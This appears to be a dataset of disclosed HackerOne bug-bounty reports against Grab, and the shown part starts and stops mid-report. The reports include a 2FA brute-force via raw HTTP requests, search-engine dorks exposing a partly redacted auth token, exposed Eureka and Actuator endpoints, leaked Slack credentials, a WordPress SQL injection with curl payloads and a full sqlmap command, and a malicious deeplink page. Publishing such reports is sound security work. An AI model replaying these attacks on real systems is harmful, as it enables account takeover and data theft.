The root cause of the problem it that facts: no rate limiting+ no code expiration. Since code has 4 digits, attacker just need to count all possible combinations from 1000 to 9999.
What happens if we do the wrong request to https://p.grabtaxi.com/api/passenger/v2/profiles/edit endpoint? Let's take a look:
Code 344 BytesWrap lines Copy Download1PUT /api/passenger/v2/profiles/edit HTTP/1.1
2Content-Type: application/x-www-form-urlencoded
3x-mts-ssid: [current session id, its too long so i removed it for report space economy]
4x-request-id: 3b609418-0e40-4f86-8ff6-4f23dfac420f
5Host: p.grabtaxi.com
6Content-Length: 26
7Accept-Encoding: gzip
8Connection: Keep-Alive
9
10profileActivationCode=3122
Response (bad request):
Code 272 BytesWrap lines Copy Download1HTTP/1.1 400 Bad Request
2Content-Encoding: gzip
3Content-Type: application/json; charset=utf-8
4Date: Tue, 31 Jan 2017 17:45:43 GMT
5X-Api-Source: grabapi
6X-Request-Id: 01800ddb-fb58-4b53-aecc-97473225f732
7Content-Length: 47
8Connection: keep-alive
9
10{""status"":400,""code"":4000}
And what when code will be correct?
Response (correct request):
Code 201 BytesWrap lines Copy Download1HTTP/1.1 204 No Content
2Content-Type: application/json; charset=utf-8
3Date: Tue, 31 Jan 2017 17:45:43 GMT
4X-Api-Source: grabapi
5X-Request-Id: 9d0eae1a-9c16-4aa5-8b40-01105a7cb994
6Connection: keep-alive
I looked to it, and wrote a simple C# tool which sends all possible codes combinations, until it finds a correct code. Source code and POC tool included to the report (it requires at least Windows 7 and NET 4.0 to run).
Impact
The attacker can bypass 2FA authentication on Grab android app. Attacker can succeed in the account takeover, changing email, phone number of the victim who use Google Auth on the app etc.
Steps To Reproduce:

Login to your Grab Android app using Google with valid phone number (2FA on the phone login option is correctly implemented, and not vulnerable).
Edit your profile name and press Save.
The 4-digit sms code will be send to your phone. Dont look to it now:)
Use my POC tool (written on C#, requires .NET 4.0). You need a one header from the any app web request (x-mts-ssid) for proper testing. You can extract it from the any request from Android app, using some Web Proxy.
If you have troubles with extracting x-mts-ssid session header from the web request - let me know. It can be tricky thing (i used android emulator, connected to Charles Web Proxy, for request monitoring).
Open the program, paste the x-mts-ssid in the text field and press ""Start"". Wait till process will ends (correct code will be found).
Compare code from the tool, and code that you received on the phone earlier - they must be equal. Also i wrote a POC video (https://drive.google.com/file/d/0B8dmpoHKDZsZSFI5WXY2RzRYT00/view?usp=sharing).

Mitigation/Remediation Steps:
I suggest you implement a rate-limiting on this endpoint, or force 2FA code expiring after, for example, 5 wrong attempts (or both of this for better security).1 attachment:F156385: tool.zipSummary by sp1d3rsI found a two-factor authentication bypass on the endpoint, used by Grab Android App.
The team was very responsible and fixed the issue fast.
Thanks to the Grab team for the great experience and the bounty!
I escalated similar issue to the any user account takeover by unauthenticated attacker in #205000 report (disclosure will be requested after clearing the private info). In this report i mentioned, that ""Login with mobile number"" endpoint is secure, and not vulnerable, but later i challenged myself, and discovered a way to bypass OTP code (not 2FA like in this report) there too.
I will disclose #205000 as soon as sensitive info there will be redacted.
P.S. the POC tool did not check the codes, which was starting from 0*** (my bad) - fortunately, it did not affect triage process. The attached tool also can be rewritten for the any other case. Yeah, it's probably the time to learn Python:)
Used tools and apps:
1) Nox App Player (android emulator), proxied through web debugging proxy.
2) Tested application - https://play.google.com/store/apps/details?id=com.grabtaxi.passenger (app allows registration from any country)
3) Custom C# code bruteforcer, attached below in the report.",https://hackerone.com/reports/202425,Singapore,Singapore,Singapore,2017,1,31,18,45
Grab,10001,0.0,200m-1b,$200.00,Medium,5.3,None,Private Grab Messages on Android App can be accessed and cached by Search Engines,"sp1d3rs  submitted a report to Grab.Apr 17th (6 years ago)Description
Hello. Today i discovered, that Search Engines can access the private users messages (OTP pins, Group invites information etc.)
It happens because the https://grab-attention.grabtaxi.com host allows search indexing, and can leak the auth_token to the Search Engines which also can lead to privilege escalation.
When vieving ""Notifications"" section on the app, i noticed the unsecure GET request to the https://grab-attention.grabtaxi.com/passenger/passenger.html?auth_token=[my_token]&view=268435456. I was surprised, when tried to repeat it in the browser - it gave me access to my messages.
POC
Image F176465: test.PNG 73.49 KiBZoom in Zoom out Copy Download
Image F176466: test2.PNG 32.09 KiBZoom in Zoom out Copy Download
Steps To Reproduce:

Cheking the private messages of other user (me):
https://grab-attention.grabtaxi.com/passenger/passenger.html?auth_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJQQVNTRU5HRVIiLCJleHAiOjQ2NDUyMzk1NDUsImlhdCI6MTQ5MTYzOTU0NSwianRpIjoiZWI0YmFiMjUtYzA2Yi00MGIzLWJiZTctMzZkYzFmMWRkZTMyIiwibG1lIjoiU1lTVEVNIiwibmFtZSI6IiIsInN1YiI6IjM2NWE0NjY0LTY1MGEtNDBjZC05YWU2LTQ4YWQwN2Q2NGY2OSJ9.eTX2dWnooTxm50Dv1VYoIZanOqCe073_AmVk97VE4p7m4e26mcWtnZzQz5IR1EwuWbs52qJLzzAIZ5KcpWoKCvadu6zuRQzy2xRk8BcFDUXGl8w8doPJbuSIHMY0K-x8Q-█████████ZTdgxLI&view=268435456#/
Checking that search engines can crawl it:
Use this Google DORK (search text):
passenger site:grab-attention.grabtaxi.com
and press Search.
You will see this cached page with auth_token (actually it was cutted due to big query length) - but it is still a huge information disclosure.

Suggested fix

Disable Search indexing on https://grab-attention.grabtaxi.com
For the better security you can change the request method to the https://grab-attention.grabtaxi.com/passenger/passenger.html endpoint from GET to POST (or encrypt it) due to that fact that auth_token are leaked in the query parameters.
2 attachments:F176465: test.PNGF176466: test2.PNGnozz_   updated the severity from medium to medium (5.3). Apr 18th (6 years ago)nozz_   changed the status to Triaged. Apr 18th (6 years ago)Hello @sp1d3rs 
We have reviewed your bug report and would like to inform you that your submission is valid. It is important to note that on investigating this issue, we found that search engine cannot crawl and index Grab-attention website from Grab application this may explain why your google dock have only one result (account from another researcher). In this context, privilege escalation looks very difficult. However, like you said we should disable search indexing and change the request method.
We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that we can verify the same.
Thanks again for your research. We appreciate your help in keeping Grab and our customers safe and secure.Grab  rewarded sp1d3rs with a $200 bounty. Apr 24th (6 years ago)grabsecurity   closed the report and changed the status to Resolved. May 25th (5 years ago)Thank you for working with us and helping us in resolving this issue.sp1d3rs   requested to disclose this report. Aug 21st (5 years ago)nozz_   agreed to disclose this report. Sep 14th (5 years ago)  This report has been disclosed. Sep 14th (5 years ago)Summary by sp1d3rsThis issue can be classified as best-practice. The exploitation against other users was very unlikely (possible under rare circumstances), but the team still decided to award me with a bounty - i very appreciate it!
The team was very responsible and fixed the issue fast.
I requested to disclose this report to show the impact from search indexing of privileged/sensitive info. The reported issue itself is not very interesting, and not impactful much, but the idea behind it can help the other researchers to find more interesting bugs:) The applications can leak to the Search Engines emails (check it using allinurl:@<mailbox_domain> site:<target_domain>), sensitive tokens (same dork, but with 3-4 entropy characters depending on discovered info upon testing), private info of other users, etc.
Many interesting things and issues can be found just by using Google/Shodan/Censys etc.",https://hackerone.com/reports/221558,Singapore,Singapore,Singapore,2017,4,17,12,51
Grab,10001,0.0,200m-1b,$250.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,stored xss in comments : driver exam ,paresh_parmar  submitted a report to Grab.Oct 4th (5 years ago)paresh_parmar   changed the report title. Oct 4th (5 years ago)grabsecurity   posted a comment. Oct 6th (5 years ago)paresh_parmar   posted a comment. Oct 6th (5 years ago)nozz_   updated the severity to medium. Oct 11th (5 years ago)nozz_   changed the status to Triaged. Oct 11th (5 years ago)Grab  rewarded paresh_parmar with a $250 bounty. Oct 27th (5 years ago)nozz_   posted a comment. Nov 20th (5 years ago)paresh_parmar   posted a comment. Nov 20th (5 years ago)nozz_   closed the report and changed the status to Resolved. Nov 20th (5 years ago)paresh_parmar   posted a comment. Nov 21st (5 years ago)nozz_   posted a comment. Nov 22nd (5 years ago)paresh_parmar   requested to disclose this report. Nov 22nd (5 years ago)paresh_parmar   posted a comment. Nov 28th (5 years ago)nozz_   posted a comment. Nov 29th (5 years ago)paresh_parmar   posted a comment. Nov 29th (5 years ago)nozz_   agreed to disclose this report. Nov 30th (5 years ago)  This report has been disclosed. Nov 30th (5 years ago),https://hackerone.com/reports/274443,Singapore,Singapore,Singapore,2017,10,4,21,12
Grab,10001,0.0,200m-1b,$250.00,Medium,5.45,Improper Access Control - Generic,Unrestricted access to Eureka server on ██████,"reptou  submitted a report to Grab.Jan 12th (5 years ago)Hi Grab Security Team, 
First of all, best wishes for 2018, empty of bugs if possible ;-) 
Summary: I found that the following endpoint is hosting Netflix Eureka Server █████ and that even if some URLs are requiring authentication (401 code for some of thems like /metrics for example), it is still possible to send requests to the REST API. 
Description: I think that this is a test infrastructure, however the dashboard some applications registered on Netflix Eureka server (please see screenshot attached ""███"") which targets private EC2 instance (nothing published on the Internet) are visible. 
Digging a little bit shows that Netflix provides a REST API described here :
Code 61 BytesWrap lines Copy Download1https://github.com/Netflix/eureka/wiki/Eureka-REST-operations
I tried some requests and it seems that it does not require any kind of authentication. I prefer to do some tests that could not lead to any disruption (even if this seems to be a test infrastructure), but for example the following request returns 200 :
Code 337 BytesWrap lines Copy Download1PUT ████████HTTP/1.1
2Host: ██████myteksi.net
3User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
6Connection: close
7Upgrade-Insecure-Requests: 1
And the response is the following 
Code 137 BytesWrap lines Copy Download1HTTP/1.1 200 
2Date: Fri, 12 Jan 2018 09:17:36 GMT
3Content-Type: application/xml
4Content-Length: 0
5Connection: close
6Server: Tengine/2.2.1
Following the description of the REST API, I think that an attacker could modify any propertie regarding the current instances registered or even register a new one with his own settings. As I am not sure if there is some production behind, I choose to report it directly without doing any modification on the current systems. 
Browsers Verified In:
N/A
Steps To Reproduce:

Go to █████████ for the dashboard access (read only)
Issue for example the above HTTP requestand check the server response (or any of the requests described in Netflix documentation)

Supporting Material/References:

List any additional material (e.g. screenshots, video, logs, etc.)

Please let me know your thoughts,
Kind regards,
Reptou
Impact
From my perspective, this could help an attacker registers his custom AWS EC2 instance into an application and make it part of the service load balancing provided by Eureka.nozz_   changed the status to Triaged. Jan 12th (5 years ago)Hi Reptou,
Thank you! Grab security team joins me in wishing you a happy new year 2018 as well.
We have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.
We appreciate your help in keeping Grab and our customers safe and secure.
    
    
        
            
                
                
                
            
        
    
reptou   posted a comment. Jan 12th (5 years ago)Hi @nozz_ 
Thank you for the super fast triage, as usual ! 
Good luck,
Reptou
    
    
        
            
                
                
                
            
        
    
reptou   posted a comment. Jan 17th (5 years ago)Hi @nozz_ 
I had a look at the endpoint and it seems that now this is landing to the tengine default web page and the issue has been fixed like this.
Could you please confirm ?
Many thanks
Reptounozz_   posted a comment. Updated Feb 3rd (5 years ago)Hi @reptou
We did not close your submission because we considers this fix temporary. We are currently working with █████ team on a permanent solution. Also noted that we are currently evaluating the impact of your finding in order to assign your bounty as soon as possible.
Once again we really appreciate your help in keeping Grab and our customers safe and secure.
    
    
        
            
                
                
                
            
        
    
reptou   posted a comment. Jan 18th (5 years ago)Hi @nozz_ 
Thank you, this is clear :) Please let me know if you need additional details.
Reptounozz_   closed the report and changed the status to Resolved. Jan 23rd (5 years ago)Thank you for working with us and helping us in resolving this issue.Grab  rewarded reptou with a $250 bounty and a $250 bonus. Updated Feb 1st (5 years ago)Hi @reptou, 
We're awarding you $250 bonus because this bug report led us to discover more vulnerabilities internally. 
Thank you for keeping us safe.
    
    
        
            
                
                
                
            
        
    
reptou   posted a comment. Feb 1st (5 years ago)Thank you for the bounty and the bonus ! prakhar-prasad   requested to disclose this report. Feb 6th (5 years ago)reptou   agreed to disclose this report. Feb 6th (5 years ago)  This report has been disclosed. Feb 6th (5 years ago)",https://hackerone.com/reports/304240,Singapore,Singapore,Singapore,2018,1,12,9,30
Grab,10001,0.0,200m-1b,$250.00,Medium,5.45,Improper Access Control - Generic,Unrestricted access to https://██████.█████myteksi.net/,"reptou  submitted a report to Grab.Jan 12th (5 years ago)Hello again Grab Security Team !
Following my previous research, it seems that your Microservices architecture you are currently running on *.█████myteksi.net is publicly exposed on another endpoint : https://█████████.█████myteksi.net. 
Summary: 
When researching and starting a new enumeration of your different subdomains, I found that https://███.████████myteksi.net is related to your Eureka / Zuul environment and is reachable without any filtering. 
Description:
This is a quite complex architecture, but I think that it reveals a lot of debug information that could help an attack find a vector, and certainly enables him to do some actions on this infrastructure without any control (this has to be confirmed as I do not want to perform any modification on your curent environment). 
In order to understand the way this infrastructure works, I read the following documentation to discover some endpoints and see what could be achieved : http://cloud.spring.io/spring-cloud-static/Finchley.M5/single/spring-cloud.html#_health_indicator_2
Regarding information gathering, there are different endpoints reachable for example :

https://█████.███████myteksi.net/info
https://████.██████myteksi.net/dump
https://███████.█████████myteksi.net/trace
https://████████.██████████myteksi.net/configprops
https://████████.███myteksi.net/env (from this one you got the eureka username and I guess the password too even if this is hidden ;-))
https://█████.████myteksi.net/beans
https://█████.█████myteksi.net/metrics
https://███.████myteksi.net/autoconfig
https://███.█████████myteksi.net/routes
https://██████████.█████████myteksi.net/features

For the action to be done, we may notice the following (extract from the documentation) :
Code 456 BytesWrap lines Copy Download1For a Spring Boot Actuator application there are some additional management endpoints:
2
3* POST to /env to update the Environment and rebind @ConfigurationProperties and log levels
4* /refresh for re-loading the boot strap context and refreshing the @RefreshScope beans
5* /restart for closing the ApplicationContext and restarting it (disabled by default)
6* /pause and /resume for calling the Lifecycle methods (stop() and start() on the ApplicationContext) 
As stated previously, I did not try these actions, but I have a good confidence that it will be executed without any restriction. 
From my point of view, this is an internal infrastructure that should not be exposed to any Internet user (as for the eureka endpoint previously reported). 
Browsers Verified In:
N/A
Steps To Reproduce:

Just try previous URL with correct HTTP Verb if necessary (GET / POST...)

Please let me know your thoughts on this,
Thank you !
Reptou
Impact
This is quite difficult to know exactly what could be achieved as the infrastructure is complex. However, I would say that it could first enable an attacker to understand better your infrastructure and identify weaknesses. The other point is that if the attacker is able to perform some actions, this could lead to DoS of this service in some cases and, of course, unexpected behaviour (modfying env properties ...)prakhar-prasad   changed the status to Triaged. Jan 13th (5 years ago)Hey @reptou, 
We're looking into this one. Thank you. prakhar-prasad   posted a comment. Jan 14th (5 years ago)We have deployed a fix to address the issue. Can you verify if this has been fixed and you're no longer able to reproduce the behaviour ?
    
    
        
            
                
                
                
            
        
    
reptou   posted a comment. Jan 14th (5 years ago)Hi @prakharprasad-grab 
Thank you for the update ! It looks like you set maybe ip filtering at the tengine web server level as i get 403 forbidden error now when testing ? It looks good for me now. 
Could you please tell me if this was related to your production infrastructure ?
I will keep you updated if I find something that could bypass this security control of course.
Thank you !
Reptou prakhar-prasad   closed the report and changed the status to Resolved. Updated Jan 14th (5 years ago)Thanks for the confirmation. 
My sincere apologies but we cannot share more information at this time.  We'll be more than happy to know if you can bypass the controls :)
Thank you for working with us to keep Grab safe. 
    
    
        
            
                
                
                
            
        
    
reptou   posted a comment. Jan 14th (5 years ago)Ok no problem I understand :) thank you and maybe see you on another report ;)
ReptouGrab  rewarded reptou with a $250 bounty. Jan 19th (5 years ago)
    
    
        
            
                
                
                
            
        
    
reptou   posted a comment. Jan 19th (5 years ago)Thanks for the bounty :)prakhar-prasad   requested to disclose this report. Feb 12th (5 years ago)reptou   agreed to disclose this report. Feb 12th (5 years ago)  This report has been disclosed. Feb 12th (5 years ago)",https://hackerone.com/reports/304386,Singapore,Singapore,Singapore,2018,1,12,22,26
Grab,10001,0.0,200m-1b,"$6,500.00",Critical,9.5,Information Disclosure,Leaking sensitive information on Github lead full access to all Grab Slack channels ,"xsam  submitted a report to Grab.Aug 21st (4 years ago)Summary:
 Accidental leakage of secret keys in such code repositories is a real problem, after my report #387117, I decided to dig deeper than the previous report and looking to some random profiles in Github, and doing some dirty work I was able to access to the developer’s company’s internal chats and files on Slack. And not only that, there’s no easy way to see if someone is eavesdropping on the communication. In the worst case scenario, these chats can leak production database credentials, source code, files with passwords and highly sensitive information.
Description:
████ is QA Automation Engineer at Grab according to his LinkedIn profile, after doing some manual search in Github. I found his Github profile which contains weird repo
https://github.com/████/
{F335908}
I was about to close that tab since there is no useful file but wait second, did you notice 30 releases?
Multiple versions for multiple OS systems, I decided to download the zip file, after the unzipping I started ███ which is an Electron application.
{F335910}
I thought it was a dead-end but I noticed the bar so I clicked Environment then Toggle Developer tools in order to know the origin of that app go to Source as attached in the screenshot below 
Image F335916: Capture_d_e_cran_2018-08-21_a__05.19.51.png 310.76 KiBZoom in Zoom out Copy Download
Know it is the time for some thinking outside of the box and be creative. As I don't have much experience with Electron apps so after some googling I found that it is possible to reverse-engineer an existing Electron app by following those steps :


Open terminal and install asar node module globally by typing npm install -g asar


Go to ████ file directory, in my case
cd /Users/mac/Downloads/██████/Contents/Resources


Create a directory to paste the content of app for example mkdir ███████-sourcecode


Unpack the app.asar file in the above directory using asar asar extract app.asar example-sourcecode


{F335918}
Now we have all available endpoints in the app or let say in gamma.grab.com as well if you go to
build/constants/google/ you will get client_secret.json
Code 421 BytesWrap lines Copy Download1{
2    ""installed"": {
3        ""client_id"": ""█████"",
4        ""project_id"": ""███████"",
5        ""auth_uri"": ""https://accounts.google.com/o/oauth2/auth"",
6        ""token_uri"": ""https://accounts.google.com/o/oauth2/token"",
7        ""auth_provider_x509_cert_url"": ""https://www.googleapis.com/oauth2/v1/certs"",
8        ""client_secret"": ""█████████"",
9        ""redirect_uris"": [""urn:ietf:wg:oauth:2.0:oob"", ""http://localhost""]
10    }
11}
and google_token.json
Code 98 BytesWrap lines Copy Download1{""access_token"":""██████████"",""refresh_token"":""████"",""token_type"":""Bearer"",""expiry_date"":█████████}
But the most usefull and impactfull files are on build/environement:

production-ph.env.json
production.env.json
staging.env.json

to verify if those token work let take for example 
Code 138 BytesWrap lines Copy Download1""slack"": {
2    ""channel"": ""█████"",
3    ""schedule_channel"": ""███████"",
4    ""token"":
5      ""xoxp-██████"",
6    ""user"": ""█████ ██████████""
7  }
Before doing we need to know what kind of token is on our hand since Slack have multiple kinds of token
Image F335920: Capture_d_e_cran_2018-08-21_a__05.49.51.png 187.87 KiBZoom in Zoom out Copy Download
Image F335921: Capture_d_e_cran_2018-08-21_a__05.51.29.png 185.40 KiBZoom in Zoom out Copy Download
So we have User tokens The xoxp-token (prefix xoxp) can be generated from the OAuth Test Token-page. This token is exactly like having the complete username and password for the user. Even for a user with two-factor authentication enabled, you can still access Slack with nothing else but this token.
And it is time to test if that token work or not? in order to that we need to follow the API documentation provided by slack here https://api.slack.com/web and try a non-sensitive method since I don't have the permission to read your internal data 
Image F335923: Capture_d_e_cran_2018-08-21_a__05.55.10.png 164.72 KiBZoom in Zoom out Copy Download 
The best example will be to list the name of all channels
Image F335924: Capture_d_e_cran_2018-08-21_a__05.57.41.png 175.46 KiBZoom in Zoom out Copy Download
So I set GET request in Burp with adding Authorization: Bearer xoxp-████as header and the result 
{F335925}
The result is 100 channels including but not limited to : 

██████
████
███████
*█████

How to protect? (Important)


Avoid git add: commands: Using wildcards can easily capture local files not truly intended to be shared, Instead of wildcards, name each file you commit, or use git add -p to review each change you add.


Name sensitive files in .gitignore & .npmignore: git support a local file listing exclusions from packaging and commits, which you can use as a safety measure against the accidental inclusion of sensitive files, and you can use GitHub’s sample .gitignore files for other inspiration.


git-secrets: git hook prevents committing in credentials: a useful tool called git-secrets. The tool hooks onto git commit and breaks the commit if it includes patterns that appear to be credential. This is a good content-focused safety net, complementing the previously suggested filename based protection.


Encrypt or use environment vars when publishing from CI.


Invalidate leaked credentials.


Reference:

https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/
https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37
https://api.slack.com/docs/token-types

Impact
As I mentioned in the summary it possible to access to the developer’s company’s internal chats and files on Slack. And not only that, there’s no easy way to see if someone is eavesdropping on the communication and there are more worst scenarios.5 attachments:F335916: Capture_d_e_cran_2018-08-21_a__05.19.51.pngF335920: Capture_d_e_cran_2018-08-21_a__05.49.51.pngF335921: Capture_d_e_cran_2018-08-21_a__05.51.29.pngF335923: Capture_d_e_cran_2018-08-21_a__05.55.10.pngF335924: Capture_d_e_cran_2018-08-21_a__05.57.41.pngprakhar-prasad   posted a comment. Aug 21st (4 years ago)Thank you for participating in our Grab Bug Bounty Program.
We are currently reviewing your bug report, we would request you give us some time while we validate your bug report.
Thanks you for your patience.prakhar-prasad   changed the status to Triaged. Aug 21st (4 years ago)prakhar-prasad   posted a comment. Aug 21st (4 years ago)Hi @samidrif,
We have revoked the affected Slack and Google tokens. Please help us verify whether the revocation has been correctly performed and you're no longer able to reproduce the behaviour.
    
    
        
            
                
                
                
            
        
    
xsam   posted a comment. Aug 21st (4 years ago)Hi @prakhar-prasad,
I can confirm that the token is revoked right now as shown below
Image F335979: Capture_d_e_cran_2018-08-21_a__11.17.09.png 53.25 KiBZoom in Zoom out Copy Download
The same thing for Google tokens.
Image F335980: Capture_d_e_cran_2018-08-21_a__11.18.54.png 143.20 KiBZoom in Zoom out Copy Download
And the repo is no longer exists, a great turn-around from you as always. +2 points for Grab bounty program if we count the point from the previous report :).
Cheers,2 attachments:F335979: Capture_d_e_cran_2018-08-21_a__11.17.09.pngF335980: Capture_d_e_cran_2018-08-21_a__11.18.54.pngprakhar-prasad   closed the report and changed the status to Resolved. Updated Aug 21st (4 years ago)Thank you for working with us and helping us in resolving this issue; we strive to keep up the +1 counter for you and all our researchers :-). We are looking forward to your next report.
We appreciate your help in keeping Grab and our customers safe and secure. Your bounty will be processed shortly.Grab  rewarded xsam with a $6,500 bounty and a $500 bonus. Aug 23rd (4 years ago)Thanks for this comprehensive and well-written report, @samidrif. We really liked the way you went out-of-box and reversed the Electron application to uncover the secrets.
We appreciate your help in keeping Grab secure. 
    
    
        
            
                
                
                
            
        
    
xsam   posted a comment. Aug 24th (4 years ago)Thank you for the reward as well as the bonus, it is a pleasure working with your program.
    
    
        
            
                
                
                
            
        
    
xsam   posted a comment. Aug 26th (4 years ago)Hi @prakhar-prasad, I noticed that you deleted the sensitive parts from the report as well as I think it is worth disclosing to share knowledge with other researchers :), so what do you think and if possible you need to remove the link to LinkedIn profile and the first screenshot as well as the screenshot from Burp request since it contains the token in headers. Thank you.prakhar-prasad   posted a comment. Aug 26th (4 years ago)Hey @samidrif,
Thanks for your message. We've already raised a request for removal of certain attachments with HackerOne; this process takes a bit of time. Nevertheless, we appreciate your help and concern. 
    
    
        
            
                
                
                
            
        
    
xsam   requested to disclose this report. Aug 27th (4 years ago)I think we are good to go :)
    
    
        
            
                
                
                
            
        
    
xsam   posted a comment. Sep 6th (4 years ago)Hello, @prakhar-prasad is there any problems because the report will be disclosed after 21 days.grabsecurity   posted a comment. Sep 6th (4 years ago)Hi @xsam,
Thank you for following up on this.  It's under review and will be disclosed soon.
We appreciate your patience.

Grab Security Team
grabsecurity   agreed to disclose this report. Sep 11th (4 years ago)  This report has been disclosed. Sep 11th (4 years ago)Grab  has locked this report. Sep 11th (4 years ago)",https://hackerone.com/reports/397527,Singapore,Singapore,Singapore,2018,8,21,5,1
Grab,10001,0.0,200m-1b,"$4,500.00",High,7.95,SQL Injection,www.drivegrab.com SQL injection,"jouko  submitted a report to Grab.Oct 3rd (5 years ago)Summary:
The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.
Description:
The plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.
The preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.
Browsers Verified In:
N/A
Steps To Reproduce:
Verifying the AJAX preview function with the cURL tool:
Code 96 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
This request shows a preset ""contact us"" form (if form id is not defined, you'll get the first form in the database).
The preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:
Code 119 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
You see that ""hello world"" appears on the page after the ""Contact us"" form.
The HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.
The Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:
Code 139 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
In the resulting HTML you see some form entries between ""XXX"" and ""YYY"".
The [display-frm-data] shortcode also accepts parameters ""order_by"" and ""order"" for sorting the entries. The ""order_by"" parameter can contain a field ID or list of them. The ""order"" parameter is supposed to contain ""ASC"" or ""DESC"" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.
Example:
Code 169 BytesWrap lines Copy Download1curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
Although this example gives no meaningful output, you should see in the server logs that the ""zzz"" went in an SQL query which produced an error message.
The shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.
The injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.
A further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.
I came up with the following sqlmap options to retrieve any data from the database:
Code 456 BytesWrap lines Copy Download1./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order=""%2a( true=true )""]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace("","","",-it.id%2b"");order_by=""id,""*true.count("","")+""id""'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query ""SELECT ██████████ FROM █████ WHERE id=2""
This works with the latest sqlmap. The ""commalesslimit"" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.
Specifically, for each comma appearing in the order parameter, the plugin appends "",it.id"" in the query. The repair code appends ""-it.id+"" after each comma to neutralize the effect. In other words, an injected ""SELECT a,b"" query would be translated to ""SELECT a,it.id b"" by the shortcode logic. The repair code changes it to ""SELECT a, it.id-it.id+b"" which evaluates to the original injected query.
Result of the above sqlmap command:
Code 479 BytesWrap lines Copy Download1[03:09:30] [INFO] testing █████
2[03:09:30] [INFO] confirming ██████
3[03:09:30] [INFO] the back-end DBMS is ███
4web application technology: █████
5back-end DBMS: ███████
6[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'
7[03:09:30] [INFO] retrieved: 1
8[03:09:43] [INFO] retrieving the length of query output
9[03:09:43] [INFO] ███
10[03:10:46] [INFO] retrieved: █████             
11SELECT ██████ FROM ████ WHERE id=2 [1]:
12[*] ██████████
Supporting Material/References:
As a proof of concept I retrieved some data.
Tables in the database:
Code 809 BytesWrap lines Copy Download1[██████████]
2+---------------------------------+
3| █████████      |
4| █████████          |
5| █████████        |
6| ███████     |
7| ██████████ |
8| ███████         |
9| ██████████      |
10| ████ |
11| ██████████                |
12| ███                   |
13| ████████ |
14| █████████                 |
15| █████                  |
16| ███             |
17| █████████                  |
18| ███████ |
19| ███████         |
20| ██████████       |
21| ████             |
22| █████                  |
23| ██████████ |
24| ███                      |
25| █████                    |
26| ██████████                   |
27| ██████████                      |
28| ████████ |
29| █████████              |
30| ████                   |
31| ██████                      |
32| ████████                   |
33| ██████                      |
34+---------------------------------+
Administrator users and their password hashes:
Code 46 BytesWrap lines Copy Download1█████
2█████
3██████
4████████
5███
6█████
7████████
Webroot path:
Code 3 BytesWrap lines Copy Download1███",https://hackerone.com/reports/273946,Singapore,Singapore,Singapore,2017,10,3,0,38
Grab,10001,0.0,200m-1b,"$7,500.00",High,7.1,Cross-site Scripting (XSS) - Generic,[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure,"bagipro  submitted a report to Grab.Aug 28th (4 years ago)Summary by bagiproI've found a set of possible deeplinks, one of them (HELPCENTER) could lead that an arbtrary URL was opened in a built-in browser in activity com.grab.pax.support.ZendeskSupportActivity using that code (should be used in an external browser/messenger)
Code 235 Bytes1<!DOCTYPE html>
2<html>
3<head><title>Page 1</title></head>
4<body style=""text-align: center;"">
5    <h1><a href=""grab://open?screenType=HELPCENTER&amp;page=https://s3.amazonaws.com/edited/page2.html"">Begin attack!</a></h1>
6</body>
7</html>
But the WebView had an interesting setting
Code 122 Bytes1        mWebView.addJavascriptInterface(new com.grab.pax.support.ZendeskSupportActivity.WebAppInterface(this), ""Android"");
with method
Code 236 Bytes1        @android.webkit.JavascriptInterface
2        public final java.lang.String getGrabUser() {
3            //...
4            return com.grab.base.p167l.GsonUtils.m7210a(zendeskSupportActivity.getMPresenter().getGrabUser());
5        }
I tested my code which forced Grab Passenger app to load https://s3.amazonaws.com/edited/page2.html page with HTML
